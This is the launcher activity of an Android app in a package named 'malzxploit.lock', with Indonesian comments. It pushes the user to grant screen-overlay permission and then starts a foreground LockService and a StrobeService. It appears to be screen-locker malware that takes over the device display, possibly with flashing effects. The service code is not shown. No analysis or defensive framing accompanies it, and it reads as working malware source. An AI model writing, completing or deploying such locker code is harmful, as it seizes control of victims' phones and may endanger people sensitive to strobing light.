package com.malzxploit.lock;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        // Cek izin overlay
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Izinkan overlay dulu", Toast.LENGTH_LONG).show();
            try {
                Intent i = new Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())
                );
                startActivityForResult(i, 100);
            } catch (Exception e) {
                try {
                    Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                    startActivityForResult(i, 100);
                } catch (Exception e2) {
                    Toast.makeText(this, "Error: " + e2.getMessage(), Toast.LENGTH_LONG).show();
                }
            }
        } else {
            startLock();
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent d) {
        super.onActivityResult(req, res, d);
        if (Build.VERSION.SDK_INT >= 23 && Settings.canDrawOverlays(this)) {
            startLock();
        } else {
            Toast.makeText(this, "Izin overlay belum di-allow", Toast.LENGTH_LONG).show();
            finish();
        }
    }

    private void startLock() {
        try {
            Intent svc = new Intent(this, LockService.class);
            Intent strobe = new Intent(this, StrobeService.class);
            try { startService(strobe); } catch (Exception ignored) {}
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
            Toast.makeText(this, "Lock aktif!", Toast.LENGTH_SHORT).show();
            // JANGAN finish() — biar user liat app-nya
            // finish();
        } catch (Exception e) {
            Toast.makeText(this, "Error start: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
}
